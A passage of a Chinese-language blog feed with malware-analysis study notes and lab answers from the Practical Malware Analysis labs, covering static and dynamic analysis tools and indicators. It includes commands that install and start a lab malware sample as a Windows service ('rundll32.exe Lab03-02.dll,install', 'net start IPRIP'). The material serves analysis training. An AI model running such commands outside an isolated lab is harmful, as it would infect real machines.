class="line">&#125;</div></pre></td></tr></table></figure><p>汇编窗口<br><img src="https://i.imgur.com/cTZFWiI.png" alt=""></p><h2 id="函数调用约定"><a href="#函数调用约定" class="headerlink" title="函数调用约定"></a>函数调用约定</h2><h3 id="cdecl"><a href="#cdecl" class="headerlink" title="cdecl"></a>cdecl</h3><p>C语言默认的函数调用方法：所有参数从右到左依次入栈，这些参数由调用者清除，称为手动清栈。</p><h3 id="stdcall"><a href="#stdcall" class="headerlink" title="stdcall"></a>stdcall</h3><p> 调用约定用于调用 Win32 API 函数。其参数都是从右向左通过堆栈传递的, 被调用方将清理堆栈</p><h3 id="fastcall"><a href="#fastcall" class="headerlink" title="fastcall"></a>fastcall</h3><p>规定将前两个参数由寄存器ecx和edx来传递(x86)，其余参数还是通过堆栈传递（从右到左）。函数调用结束后由被调用函数清除栈内数据</p><h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><h3 id="lab06-01"><a href="#lab06-01" class="headerlink" title="lab06-01"></a>lab06-01</h3><p>1、由main函数调用的唯一子过程中发现的主要代码结构是什么?<br>有一个if-else结构体<br>2、位于0x40105f的子过程是什么？<br>一个结构体，输出函数<br>3、这个程序的目的是什么？<br>判断网络连接状态</p><h3 id="lab06-2"><a href="#lab06-2" class="headerlink" title="lab06-2"></a>lab06-2</h3><p>1、main函数调用的第一个子过程执行什么操作？<br>判断网络连接状态<br>2、位于0x40117F的子过程是什么？<br>一个结构体，输出函数<br>3、被main函数调用的第二个子过程做了什么？<br><img src="https://i.imgur.com/gtfKGxY.png" alt=""><br>一个连接网络的函数<br>4、在这个子过程中使用了什么类型的代码结构？<br>使用了if-else和结构体<br>5、在这个子过程中使用了什么类型的代码结构？<br>指定连接这个域名 <a href="http://www.practicalmalwareanalysis.com" target="_blank" rel="external">http://www.practicalmalwareanalysis.com</a><br>6、这个恶意代码的目的是什么？<br>判断是否有网络并且连接这个域名 <a href="http://www.practicalmalwareanalysis.com" target="_blank" rel="external">http://www.practicalmalwareanalysis.com</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;C语言是最基础的高级编程语言，许多恶意代码都是有C编写的&lt;br&gt;
    
    </summary>
    
      <category term="re" scheme="http://yoursite.com/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>恶意代码分析——静态与动态分析基础技术</title>
    <link href="http://yoursite.com/2018/04/20/re_13_evil_1/"/>
    <id>http://yoursite.com/2018/04/20/re_13_evil_1/</id>
    <published>2018-04-20T00:49:18.000Z</published>
    <updated>2018-06-13T08:12:50.652Z</updated>
    
    <content type="html"><![CDATA[<p>啥？你电脑中病毒啦，被勒索啦，那就来好好学习恶意代码分析，讲得很好。留下了没有技术的眼泪<br><a id="more"></a></p><h1 id="恶意代码"><a href="#恶意代码" class="headerlink" title="恶意代码"></a>恶意代码</h1><h2 id="什么是恶意代码分析"><a href="#什么是恶意代码分析" class="headerlink" title="什么是恶意代码分析"></a>什么是恶意代码分析</h2><p>恶意代码也称为恶意软件:任何以某种方式来对用户、计算机或者网络炒成破坏的软件，包括计算机病毒、木马、蠕虫、内核套件、勒索软件、间谍软件；</p><h2 id="各种鸡汤"><a href="#各种鸡汤" class="headerlink" title="各种鸡汤"></a>各种鸡汤</h2><p>不管你是否有恶意代码分析的背景或经验，你都会从本书中受益。若你将要被安全公司炒，那么你马上拿起这本书啃，这将会帮助你保住饭碗。若你还是对恶意软件一无所知，那么你会将开启一闪全新的大门。。鸡汤再多，还是要动手实践，实践是检测能力的唯一标准。</p><h2 id="恶意代码类型"><a href="#恶意代码类型" class="headerlink" title="恶意代码类型"></a>恶意代码类型</h2><p>1、后门: 恶意代码将自身安装到一台计算机来 允许攻击者来访问。后门程序通常让攻击者只需很少认证甚至无需认证，便可连接到 远程计算机上，并可以在本地系统执行命令。<br>2、僵尸网络：与后门类似，也允许攻击者访问系统。但是所有被同一个僵尸网络感染的计算机将会从一台控制命令服务器收到相同的命令<br>3、下载器:这是一类只是用来下载其他恶意代码的恶意代码。下载器通常是在攻击者获得系统的访问时，首先进行安装的。下载程序会下载和安装其他的恶意代码。<br>4、间谍软件:这是一类从受害计算机上收集信息并发送给攻击者的恶意代码。比如:键盘记录器<br>5、启动器: 用来启动其他恶意程序的恶意软件。一般使用一些非传统的技术，以确保其隐蔽性，或者以获取高权限访问系统。<br>6、内核套件: 设计用来隐藏其他恶意代码的恶意软件。通常与其他恶意代码(后门)组合成工具套装。<br>7、勒索软件:通过骚扰、恐吓甚至采用绑架用户文件等方式，使用户数据资产或计算资源无法正常使用，并以此为条件向用户勒索钱财。这类用户数据资产包括文档、邮件、数据库、源代码、图片、压缩文件等多种文件。赎金形式包括真实货币、比特币或其它虚拟货币。<br>8、发送垃圾邮件的恶意代码:这类恶意代码在感染用户计算机之后，便会使用系统与网络资源来发送大量的垃圾邮件。<br>9、蠕虫或计算机病毒:可以自我复制和感染其他计算机的恶意代码。</p><h1 id="静态分析基础技术"><a href="#静态分析基础技术" class="headerlink" title="静态分析基础技术"></a>静态分析基础技术</h1><h2 id="知识技能依赖"><a href="#知识技能依赖" class="headerlink" title="知识技能依赖"></a>知识技能依赖</h2><p><img src="https://i.imgur.com/e3549Sc.png" alt=""><br>要能够对恶意代码进行分析，需要掌握大量的知识，以及较强的代码逆向分析能力，代码调试能力。</p><p>要分析恶意软件执行了哪些行为，首先需要知道恶意软件常见的一些行为，如反弹shell，进程感染，文件隐藏，信息收集等。而要弄清这些行为，恶意软件需要对文件，注册表，进程进行操作，同时恶意软件要对感染的主机下发指令，传输收集到的信息，通常需要建立网络连接。要更准确的分析需要知道使用了哪些WinAPI实现了这些功能。<br><img src="https://i.imgur.com/b6hY9oN.png" alt=""><br>对于初级的分析方法，只要掌握常见的知识，以及一些工具的使用即可快速的掌握。如可以使用工具分析文件的hash值，字符串，函数表，函数库依赖关系。 另外可以运行恶意代码用工具监控恶意软件对文件，注册表，网络，进程的访问与操作。</p><p>要深入到代码层级去分析恶意代码，需要代码逆向分析的能力，需要读的懂汇编代码，熟练使用IDA进行分析，熟练使用ollydbg等调试工具。<br><img src="https://i.imgur.com/N9C61OA.png" alt=""></p><h2 id="反病毒引擎扫描-实用的第一步"><a href="#反病毒引擎扫描-实用的第一步" class="headerlink" title="反病毒引擎扫描:实用的第一步"></a>反病毒引擎扫描:实用的第一步</h2><p>当分析一个可疑的代码样本时，第一步就最好是拿多个反病毒软件扫描下这个文件，看是否有哪个引擎已经能够识别它。因为反病毒软件主要依靠一个已知的恶意代码可识别片段的特征数据库(病毒文件特征库)，以及基于行为与模式匹配的分析(启发式检测)。而攻击者可以轻易的修改自己的代码。这时，对同一个可疑恶意代码样本，运行多个不同的反病毒软件进行扫描检测 是相当有必要的，类似VirusTotal(<a href="http://www.virustotal.com/" target="_blank" rel="external">http://www.virustotal.com/</a>)<br>在没有恶意代码分析所需要的一些知识和技能的情况下，使用现成的杀毒工具无疑是最好的方法。即使有这个能力，如果恶意软件样本的泄露不会造成重要资产的泄露，使用现成的工具进行扫描也能够提供很多有用的信息，减少大量的人工投入。</p><p>其中最为常用的就是PC端的杀毒软件，如360，腾讯安全管家等。但是不管是哪款杀毒软件都存在一定的误报和漏报。使用在线等多引擎杀毒软件能够较好的反应是否为恶意软件<br><a href="http://www.virscan.org/" target="_blank" rel="external">http://www.virscan.org/</a><br>在上面的网站上，分析包括了基本信息，关键行为，进程行为，文件行为，网络行为，注册表行为，其他行为这些恶意软件常见的操作目标。<br>静态文件分析方法如下图所示（数字代表优先级，星星表示收集了对应的工具）<br><img src="https://i.imgur.com/Cp5LcV2.png" alt=""></p><h2 id="哈希值-恶意代码的指纹"><a href="#哈希值-恶意代码的指纹" class="headerlink" title="哈希值:恶意代码的指纹"></a>哈希值:恶意代码的指纹</h2><p>哈希是一种用来唯一标识恶意代码的常用方法。恶意代码样本通过一个哈希程序，会产生出一段用于唯一标识这个样本的独特哈希值(类似一种指纹)<br>MD5算法是恶意代码分析最为常用的一种哈希函数，SHA算法也同样流行。<br>如:使用md5deep程序来计算Windows操作系统自带的Solitaire程序哈希值,然后在线查找搜索这段哈希值，看看这个文件是否被识别：<br><img src="https://i.imgur.com/bEqXNCU.png" alt=""><br>图形化界面WinMD5计算器，可以同时计算和显示出多个文件的哈希值。<br><img src="https://i.imgur.com/IK6PVpj.png" alt=""><br>一旦你对一个恶意样本拥有一个哈希值之后，你可以把它做如下用途:<br>将哈希值作为标签使用<br>与其他分析师分享哈希值，以帮助他们来识别恶意代码<br>在线搜索这段 哈希值，看看这个文件是否被识</p><h2 id="查找字符串"><a href="#查找字符串" class="headerlink" title="查找字符串"></a>查找字符串</h2><p>一个程序会包含一些字符串，比如打印出的消息，连接的URL,或者复制文到某个特定的位置。从字符串中进行搜索是获取程序功能提示的一种简单方法 。比如程序访问一个URL，访问的URL就是存储为程序中的一个字符串。可以使用String程序(<a href="http://technet.microsoft.com/enus/sysinternals/bb897439)来搜索可执行文件中可打印的字符串。" target="_blank" rel="external">http://technet.microsoft.com/enus/sysinternals/bb897439)来搜索可执行文件中可打印的字符串。</a><br>而一般在可执行文件中是以ACSII码和Unicode(这里指的是微软的)存储的，如下<br><img src="https://i.imgur.com/usLtFRz.png" alt=""><br>查找结果<br><img src="https://i.imgur.com/qLjIY8G.png" alt=""></p><h2 id="加壳与混淆恶意代码"><a href="#加壳与混淆恶意代码" class="headerlink" title="加壳与混淆恶意代码"></a>加壳与混淆恶意代码</h2><p>恶意代码编写者经常使用加壳或混淆技术，让程序更难被检测或分析。混淆程序是恶意代码编写者尝试去隐藏其执行过程的代码。而加壳程序则是混淆程序的一类，加壳后的恶意程序一般会被压缩，并且难以分析。<br>合法程序大多总是会包含很多字符串，而由被加壳或混淆的恶意代码直接分析获得的字符串很少(一般包含LoadLibrary和GetProcAddress函数，他们是用来加载和使用其他函数功能的)。</p><h2 id="文件加壳"><a href="#文件加壳" class="headerlink" title="文件加壳"></a>文件加壳</h2><p>当加壳文件的程序运行时，会先进行一小段的脱壳代码，来解压缩加壳的文件，然后在运行脱壳后的文件，如下图。<br><img src="https://i.imgur.com/Xe453HQ.png" alt=""><br>当对一个加壳程序进行静态分析时，只有这一小段代码可以被解析。</p><h3 id="使用PEID-或exeinfoPE-检测加壳"><a href="#使用PEID-或exeinfoPE-检测加壳" class="headerlink" title="使用PEID(或exeinfoPE)检测加壳"></a>使用PEID(或exeinfoPE)检测加壳</h3><h2 id="PE的文件结构"><a href="#PE的文件结构" class="headerlink" title="PE的文件结构"></a>PE的文件结构</h2><p>我前面有写<br><a href="https://esebanana.github.io/2018/03/21/re_PE/" target="_blank" rel="external">https://esebanana.github.io/2018/03/21/re_PE/</a></p><h2 id="链接库与函数"><a href="#链接库与函数" class="headerlink" title="链接库与函数"></a>链接库与函数</h2><p>对于一个可执行文件，我们可以收集到最有用的信息之一，就是它的导入表。导入表函数是一个程序所使用的函数，但存储在其他程序中的那些函数。链接分为:静态链接，运行时链接与动态链接</p><h3 id="静态链接，运行时链接与动态链接"><a href="#静态链接，运行时链接与动态链接" class="headerlink" title="静态链接，运行时链接与动态链接"></a>静态链接，运行时链接与动态链接</h3><pre><code>静态链接是Windows平台链接代码库最不常用的方法，当一个库被静态链接到可执行文件时，所有这个库中的代码都会被复制到可执行文件中。这会让执行程序大很多。运行时链接在合法程序中并不流行，但是在恶意代码中是常用的，特别是当恶意代码被加壳或是混淆的时候。使用运行时链接的可执行程序，只有当需要使用函数时，才链接到库，而不是想动态链接模式那样在程序启动时就会链接。动态链接是windows里最常用的，将一些函数打包在一个dll里，然后通过程序调用dll里的函数，在程序启动时就会链接上。</code></pre><h3 id="使用Dependency-Walker工具探索动态链接函数"><a href="#使用Dependency-Walker工具探索动态链接函数" class="headerlink" title="使用Dependency Walker工具探索动态链接函数"></a>使用Dependency Walker工具探索动态链接函数</h3><p>界面<br><img src="https://i.imgur.com/GPksbSz.png" alt=""><br>常见的dll<br><img src="https://i.imgur.com/l6sqRh6.png" alt=""></p><h2 id="实践1"><a href="#实践1" class="headerlink" title="实践1"></a>实践1</h2><p>学习样本:<a href="https://github.com/mikesiko/PracticalMalwareAnalysis-Labs" target="_blank" rel="external">这里</a></p><h3 id="反病毒引擎扫描"><a href="#反病毒引擎扫描" class="headerlink" title="反病毒引擎扫描"></a>反病毒引擎扫描</h3><p>将Lab01-01.exe和Lab01-01.dll放到<a href="https://www.virustotal.com结果如下(我是翻墙的)：" target="_blank" rel="external">https://www.virustotal.com结果如下(我是翻墙的)：</a><br><img src="https://i.imgur.com/0oxKOCq.png" alt=""><br><img src="https://i.imgur.com/9q5Cwxd.png" alt=""></p><h3 id="什么时候编译的"><a href="#什么时候编译的" class="headerlink" title="什么时候编译的"></a>什么时候编译的</h3><p><img src="https://i.imgur.com/2fCf4JN.png" alt=""></p><h3 id="是否被混淆或者加壳"><a href="#是否被混淆或者加壳" class="headerlink" title="是否被混淆或者加壳"></a>是否被混淆或者加壳</h3><p><img src="https://i.imgur.com/6l4SNrb.png" alt=""><br>发现并没有加壳，但是用Dependency Walker查看发现并没有很多函数，可能被混淆啦。接着用strings 查看dll,发现一个ip地址<br><img src="https://i.imgur.com/tY54N4S.png" alt=""></p><h3 id="是否导入函数，是做什么的"><a href="#是否导入函数，是做什么的" class="headerlink" title="是否导入函数，是做什么的"></a>是否导入函数，是做什么的</h3><p>发现有两个重要的结果<br>1.点用到内核函数库Kernel32.dll函数库中的几个重要的函数，CreateProcessA，Sleep.<br>2.调用MSVCRT.dll多线程库，调用网络链接库，外加上一个IP地址，猜测用到http服务</p><h3 id="是否有任何其它文件或基于主机的迹象"><a href="#是否有任何其它文件或基于主机的迹象" class="headerlink" title="是否有任何其它文件或基于主机的迹象"></a>是否有任何其它文件或基于主机的迹象</h3><p>用PEview打开<br><img src="https://i.imgur.com/lyOtUHh.png" alt=""><br>首先是两个近似函数Kernel32.dll  与Kerne132.dll，初步判断是进行文件混淆目的。<br>然后是一个系统目录路径，一个函数Kerne132.dll，初步判断是这个路径和Kerne132.dll存在某种关联。<br>然后再来两个Kernel32.dll 和Lab01-01.dll，Lab01-01.dll这很明显就是上面分析的.dll文件，所以初步判定是这个程序需要调用到Kernel32.dll 和Lab01-01.dll。<br>然后是系统路径和Kernel32.dll文件，和一个函数。这就是说调用到系统路径里的Kernel32.dll文件的某个函数<br>众多联系起来可以进一步判断，这个程序实现的功能是在系统路径中寻找，创建，复制一个Kerne132.dll文件，然后还调用了Lab01-01.dll文件实现它里面的功能。</p><h3 id="是否有基于网络的迹象"><a href="#是否有基于网络的迹象" class="headerlink" title="是否有基于网络的迹象"></a>是否有基于网络的迹象</h3><p>有基于网络的迹象，发现IP：127.26.152.13，这个IP地址预示做为教学，如果是真正的恶意代码，这个IP地址应该是可路由的公网IP地址。它会是一个很好的基于网络的恶意代码感染迹象，可以用来识别这个恶意代码。</p><h3 id="文件的目的是什么"><a href="#文件的目的是什么" class="headerlink" title="文件的目的是什么"></a>文件的目的是什么</h3><p>该文件并没有加壳，她住要实现的功能是，调用Kernel32.dll文件的相关函数，实现在系统目录里面遍历查找是否存在Kerne132.dll文件，如果不存在就进行创建Kerne132.dll文件，进行混淆Kernel32.dll文件，然后再调用Lab01-01.dll文件，实现通过联通网络，然后接受目标IP：127.26.152.13传过来的指令，通过该文件后门向系统发出休眠指令使得系统进入休眠状态。</p><h2 id="实践2"><a href="#实践2" class="headerlink" title="实践2"></a>实践2</h2><p>2、有一些迹象表明，这是通过upx加壳的，可以手脱或者网上寻找工具来进行脱壳。<br>3、在脱壳的程序中，会发现一下函数，CreateService，InternetOpen、InternetOpenURL<br>4、通过名为Malserice服务，并通过连接url的网络流量来检查恶意代码的主机。</p><h1 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h1><p>动态分析就是在运行恶意代码之后进行检查的过程。动态分析技术是恶意代码分析流程的第二步，一般在静态分析基础技术进入一个困难的时候。，动态分析能让你观察到恶意代码的真实功能，一个行为存在二进制程序中，并不意味着他就会执行，动态分析也是一种识别恶意代码功能的有效方法。虽然动态分析技术分成好用，但它还是应该在静态分析基础技术之后进行。</p><h2 id="沙箱"><a href="#沙箱" class="headerlink" title="沙箱"></a>沙箱</h2><h3 id="简便但粗糙的方法"><a href="#简便但粗糙的方法" class="headerlink" title="简便但粗糙的方法"></a>简便但粗糙的方法</h3><p>有几个功能一体化的软件产品，可以用来进行基本的动态分析，最流行的就是沙箱技术，沙箱是一种在安全环境里运行不信任程序的安全机制，不用担心伤害到”真正的”系统。沙箱包含一个虚拟环境，通过某种方式模拟网络服务，以确保被测试的软件或恶意代码能正常执行。</p><h3 id="使用恶意代码沙箱"><a href="#使用恶意代码沙箱" class="headerlink" title="使用恶意代码沙箱"></a>使用恶意代码沙箱</h3><p>许多分析容易的代码的沙箱，诸如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Norman沙箱，GFI沙箱，Anubis,Joe沙箱、ThreatExpert\BitBlaze和Comodo</div></pre></td></tr></table></figure></p><p>恶意代码分析，等等，都是提供免费分析恶意代码服务。Norman沙箱，GFI沙箱是最受欢迎的。这些沙箱都提供容易理解的输出结果，而且用来做初诊断非常有用，而且这些沙箱都是自动执行的。</p><h2 id="rundll32-exe"><a href="#rundll32-exe" class="headerlink" title="rundll32.exe"></a>rundll32.exe</h2><p>所有windows版本中都包含rundll32.exe程序，它提供了一个运行DLL的平台<br>语法：C:\rundll32.exe DLLname,Export arguments</p><h2 id="Process-Monitor"><a href="#Process-Monitor" class="headerlink" title="Process Monitor"></a>Process Monitor</h2><p>进程监视器，它提供一种方式来监控注册表，文件系统，网络，进程和线程行为，结合并增强了FileMon和RegMon的功能</p><h2 id="Process-Explorer"><a href="#Process-Explorer" class="headerlink" title="Process Explorer"></a>Process Explorer</h2><p>进程浏览器，用来列出所有活跃的进程，被进程载入的DLL，各种进程属性和整体系统信息，也可以用它杀死一个进程，退出用户登录，启动与激活进程</p><h2 id="Dependency-Walker"><a href="#Dependency-Walker" class="headerlink" title="Dependency Walker"></a>Dependency Walker</h2><p>支持列出可执行文件的动态链接</p><h2 id="Regshot"><a href="#Regshot" class="headerlink" title="Regshot"></a>Regshot</h2><p>注册表比较工具，可以比较两个注册表的快照，发现差异</p><h2 id="ApateDNS"><a href="#ApateDNS" class="headerlink" title="ApateDNS"></a>ApateDNS</h2><p>用来查看恶意代码发出的DNS请求</p><h2 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h2><p>被用在支持端口扫描，隧道，代理，端口转发等对内外连接上</p><h2 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h2><p>嗅探器，截获并记录网络数据包的工具</p><h2 id="INetSim"><a href="#INetSim" class="headerlink" title="INetSim"></a>INetSim</h2><p>基于linux模拟常见网络服务的免费软件，通过模拟服务（HTTP，HTTPS，FTP，IRC，DNS，SMTP等），允许你来分析未知恶意代码的网络行为</p><h2 id="动态分析技术实践"><a href="#动态分析技术实践" class="headerlink" title="动态分析技术实践"></a>动态分析技术实践</h2><h3 id="lab3-1"><a href="#lab3-1" class="headerlink" title="lab3-1"></a>lab3-1</h3><h4 id="找出这个恶意代码的导入函数与字符串列表"><a href="#找出这个恶意代码的导入函数与字符串列表" class="headerlink" title="找出这个恶意代码的导入函数与字符串列表"></a>找出这个恶意代码的导入函数与字符串列表</h4><p>用Dependecy Walker和Peid查看,发现导入函数很少，接着发现加壳<br><img src="https://i.imgur.com/1VeV9Fp.png" alt=""><br>用strings工具查看，发现一个网站和admin，注册表<br><img src="https://i.imgur.com/GfEHrtj.png" alt=""></p><h4 id="这个恶意代码在主机上的感染迹象特征是什么"><a href="#这个恶意代码在主机上的感染迹象特征是什么" class="headerlink" title="这个恶意代码在主机上的感染迹象特征是什么"></a>这个恶意代码在主机上的感染迹象特征是什么</h4><p>先将虚拟机拍快照，然后准备运行，win7上发现运行不了<br><img src="https://i.imgur.com/7yBNGk5.png" alt=""><br>然后找个xp pro x86的运行<br><img src="https://i.imgur.com/nnmlZWy.png" alt=""><br>可以看出程序一共修改了17处的注册表，其中，增加了2个键，3个值，改变了12个指，新建的键是上面这2个，新建了两个打印的键，新添加的值是上面这3个，一个是开机启动的值，为C:\WINDOWS\system32\vmx32to64.ex。</p><h4 id="是否存在一些有用的网络特征码？"><a href="#是否存在一些有用的网络特征码？" class="headerlink" title="是否存在一些有用的网络特征码？"></a>是否存在一些有用的网络特征码？</h4><p>网络特征码就是那个恶意域名的解析过程和https的连接</p><h3 id="lab3-1-1"><a href="#lab3-1-1" class="headerlink" title="lab3-1"></a>lab3-1</h3><h4 id="你怎样才能让这个恶意代码自行安装"><a href="#你怎样才能让这个恶意代码自行安装" class="headerlink" title="你怎样才能让这个恶意代码自行安装"></a>你怎样才能让这个恶意代码自行安装</h4><p>有PEview查看dll的导入表<br><img src="https://i.imgur.com/glgDAB1.png" alt=""><br>用Dependency Walker查看依赖，会发现一些创建线程函数，注册表，网络服务。<br><img src="https://i.imgur.com/DHYqe5h.png" alt=""><br>用strings来看看，发现一个域名practicalmalwareanalysis.com，serve.html，getfile，cmd.exe /c,还有一些注册表操作的语句<br><img src="https://i.imgur.com/bTutnPU.png" alt=""><br>这是运行:<br><code>rundll32.exe Lab03-02.dll,install</code></p><h4 id="在安装之后，你如何让这个恶意代码运行起来？"><a href="#在安装之后，你如何让这个恶意代码运行起来？" class="headerlink" title="在安装之后，你如何让这个恶意代码运行起来？"></a>在安装之后，你如何让这个恶意代码运行起来？</h4><p>用windows启动服务的方式来启动<br><code>net start IPRIP</code></p><h4 id="你怎么能找到这个恶意代码是在哪个进程下运行的？"><a href="#你怎么能找到这个恶意代码是在哪个进程下运行的？" class="headerlink" title="你怎么能找到这个恶意代码是在哪个进程下运行的？"></a>你怎么能找到这个恶意代码是在哪个进程下运行的？</h4><p>用Process Explorer，Find菜单-&gt; Find Handle or DLL…寻找我们那个DLL文件</p><h4 id="你可以在procmon工具中设置什么样的过滤器，才能收集这个恶意代码的信息？"><a href="#你可以在procmon工具中设置什么样的过滤器，才能收集这个恶意代码的信息？" class="headerlink" title="你可以在procmon工具中设置什么样的过滤器，才能收集这个恶意代码的信息？"></a>你可以在procmon工具中设置什么样的过滤器，才能收集这个恶意代码的信息？</h4><p>用发现的PID就行过滤，</p><h4 id="这个恶意代码在主机上的感染迹象是什么？"><a href="#这个恶意代码在主机上的感染迹象是什么？" class="headerlink" title="这个恶意代码在主机上的感染迹象是什么？"></a>这个恶意代码在主机上的感染迹象是什么？</h4><p>感染迹象就是会有创建一个服务叫IPRIP</p><h4 id="这个恶意代码是否存在一些有用的网路特征码？"><a href="#这个恶意代码是否存在一些有用的网路特征码？" class="headerlink" title="这个恶意代码是否存在一些有用的网路特征码？"></a>这个恶意代码是否存在一些有用的网路特征码？</h4><p>我们先去看看DNSChef和INetSim服务器上的 记录，先检查一下dns的解析记录，用DNSChef虚拟机看，和我们前面发现的恶意域名是对应的，记录在log/service.log里面，这个DLL从我们的fake服务器下载一个serve.html，而我们伟大的INetSim返回了sample.html作为serve.html，其实这里就不需要用netcat来监听本地80端口了<br>所以这个网络特征就是那个漫长的恶意域名的解析，和对恶意域名请求一个serve.html</p><h2 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h2><p>这里可以下载到所有的工具:<br><a href="https://github.com/vito-L/malware-analysis/blob/master/Tools.md" target="_blank" rel="external">https://github.com/vito-L/malware-analysis/blob/master/Tools.md</a><br>恶意代码分析实战</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;啥？你电脑中病毒啦，被勒索啦，那就来好好学习恶意代码分析，讲得很好。留下了没有技术的眼泪&lt;br&gt;
    
    </summary>
    
      <category term="re" scheme="http://yoursite.com/categories/re/"/>
    
    
  </entry>
  
</feed>
